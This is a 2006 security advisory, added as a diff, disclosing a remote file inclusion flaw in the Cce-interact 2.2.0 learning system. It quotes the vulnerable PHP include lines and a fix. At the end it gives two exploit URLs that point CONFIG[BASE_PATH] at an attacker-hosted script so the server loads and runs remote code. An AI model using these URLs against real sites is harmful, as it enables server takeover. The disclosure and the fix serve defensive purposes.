@@ -1,0 +1,130 @@
+/*
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+- Cce-interact <= 2.2.0 (CONFIG[BASE_PATH]) Remote File Include Vulnerability
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+- [Script name: Interact - Online Learning and Collaboration System v. 2.2.0
+- [Script site: https://sourceforge.net/projects/cce-interact/
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+-          Find by: Kacper (a.k.a Rahim)
++
+-          Contact: kacper1964@yahoo.pl
+-                        or
+-          http://www.devilteam.yum.pl/
+-                       and
+-           http://www.rahim.webd.pl/
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+- Special Greetz: DragonHeart ;-)
+- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi
+-
+!@ Przyjazni nie da sie zamienic na marne korzysci @!
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+-            Z Dedykacja dla osoby,
+-         bez ktorej nie mogl bym zyc...
+-           K.C:* J.M (a.k.a Magaja)
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+*/
+/*
++++++++++++++++++++++START+++++++++++++++++++++++
+vulnerable code => admin/autoprompter.php line 33-38:
+....
+
+require_once($CONFIG['BASE_PATH'].'/modules/forum/autoprompt/prompt.inc.php');
+require_once($CONFIG['LANGUAGE_CPATH'].'/forum_strings.inc.php');
+
+$rs = $CONN->Execute("SELECT {$CONFIG['DB_PREFIX']}posts.post_key,
+{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.SpaceKey,
+{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.GroupKey,
+{$CONFIG['DB_PREFIX']}ForumThreadManagement.NumberToPrompt,
+{$CONFIG['DB_PREFIX']}posts.subject,
+{$CONFIG['DB_PREFIX']}posts.body,{$CONFIG['DB_PREFIX']}posts.module_key,{$CONFIG['DB_PREFIX']}posts.thread_key,{$CONFIG['DB_PREFIX']}ForumThreadManagement.MinimumReplies,{$CONFIG['DB_PREFIX']}Spaces.Name,
+{$CONFIG['DB_PREFIX']}posts.added_by_key FROM
+{$CONFIG['DB_PREFIX']}posts,{$CONFIG['DB_PREFIX']}ModuleSpaceLinks,{$CONFIG['DB_PREFIX']}ForumThreadManagement,{$CONFIG['DB_PREFIX']}Spaces
+LEFT JOIN {$CONFIG['DB_PREFIX']}postsAutoPrompts ON
+{$CONFIG['DB_PREFIX']}ForumThreadManagement.Postkey={$CONFIG['DB_PREFIX']}postsAutoPrompts.post_key
+WHERE
+{$CONFIG['DB_PREFIX']}ForumThreadManagement.PostKey={$CONFIG['DB_PREFIX']}posts.post_key
+AND
+{$CONFIG['DB_PREFIX']}posts.module_key={$CONFIG['DB_PREFIX']}ModuleSpaceLinks.ModuleKey
+AND
+{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.SpaceKey={$CONFIG['DB_PREFIX']}Spaces.SpaceKey
+AND
+{$CONFIG['DB_PREFIX']}posts.date_added<DATE_SUB(CURRENT_DATE,INTERVAL
+{$CONFIG['DB_PREFIX']}ForumThreadManagement.DaysToWait DAY) AND
+{$CONFIG['DB_PREFIX']}postsAutoPrompts.post_key IS NULL ORDER BY
+{$CONFIG['DB_PREFIX']}posts.post_key");
+
+....
++++++++++++++++++++++FIX+++++++++++++++++++++++++
+admin/autoprompter.php line 33-38:
+....
+require_once('../local/config.inc.php');
+require_once($CONFIG['BASE_PATH'].'/modules/forum/autoprompt/prompt.inc.php');
+require_once($CONFIG['LANGUAGE_CPATH'].'/forum_strings.inc.php');
+
+$rs = $CONN->Execute("SELECT {$CONFIG['DB_PREFIX']}posts.post_key,
+{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.SpaceKey,
+{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.GroupKey,
+{$CONFIG['DB_PREFIX']}ForumThreadManagement.NumberToPrompt,
+{$CONFIG['DB_PREFIX']}posts.subject,
+{$CONFIG['DB_PREFIX']}posts.body,{$CONFIG['DB_PREFIX']}posts.module_key,{$CONFIG['DB_PREFIX']}posts.thread_key,{$CONFIG['DB_PREFIX']}ForumThreadManagement.MinimumReplies,{$CONFIG['DB_PREFIX']}Spaces.Name,
+{$CONFIG['DB_PREFIX']}posts.added_by_key FROM
+{$CONFIG['DB_PREFIX']}posts,{$CONFIG['DB_PREFIX']}ModuleSpaceLinks,{$CONFIG['DB_PREFIX']}ForumThreadManagement,{$CONFIG['DB_PREFIX']}Spaces
+LEFT JOIN {$CONFIG['DB_PREFIX']}postsAutoPrompts ON
+{$CONFIG['DB_PREFIX']}ForumThreadManagement.Postkey={$CONFIG['DB_PREFIX']}postsAutoPrompts.post_key
+WHERE
+{$CONFIG['DB_PREFIX']}ForumThreadManagement.PostKey={$CONFIG['DB_PREFIX']}posts.post_key
+AND
+{$CONFIG['DB_PREFIX']}posts.module_key={$CONFIG['DB_PREFIX']}ModuleSpaceLinks.ModuleKey
+AND
+{$CONFIG['DB_PREFIX']}ModuleSpaceLinks.SpaceKey={$CONFIG['DB_PREFIX']}Spaces.SpaceKey
+AND
+{$CONFIG['DB_PREFIX']}posts.date_added<DATE_SUB(CURRENT_DATE,INTERVAL
+{$CONFIG['DB_PREFIX']}ForumThreadManagement.DaysToWait DAY) AND
+{$CONFIG['DB_PREFIX']}postsAutoPrompts.post_key IS NULL ORDER BY
+{$CONFIG['DB_PREFIX']}posts.post_key");
+
+....
++++++++++++++++++++++++++++++++++++++++++++++++++
+vulnerable code => includes/common.inc.php line 35-40:
+....
+
+$CONFIG['ADODB_PATH']    = $CONFIG['BASE_PATH'].'/includes/adodb';
+//Include database abstraction classes
+require_once($CONFIG['ADODB_PATH'].'/adodb.inc.php');
+require_once($CONFIG['ADODB_PATH'].'/session/adodb-session.php');
+
+....
++++++++++++++++++++++FIX+++++++++++++++++++++++++
+includes/common.inc.php line 35-40:
+....
+
+require_once('../local/config.inc.php');
+$CONFIG['ADODB_PATH']    = $CONFIG['BASE_PATH'].'/includes/adodb';
+//Include database abstraction classes
+require_once($CONFIG['ADODB_PATH'].'/adodb.inc.php');
+require_once($CONFIG['ADODB_PATH'].'/session/adodb-session.php');
+
+....
+++++++++++++++++++++THE+END++++++++++++++++++++++
+*/
+#Exploit:
+
+http://www.site.com/[Cce-interact_path]/admin/autoprompter.php?CONFIG[BASE_PATH]=[http://www.myevilsite.com/evil_scripts.txt]
+
+http://www.site.com/[Cce-interact_path]/includes/common.inc.php?CONFIG[BASE_PATH]=[http://www.myevilsite.com/evil_scripts.txt]
+
+# milw0rm.com [2006-08-19]
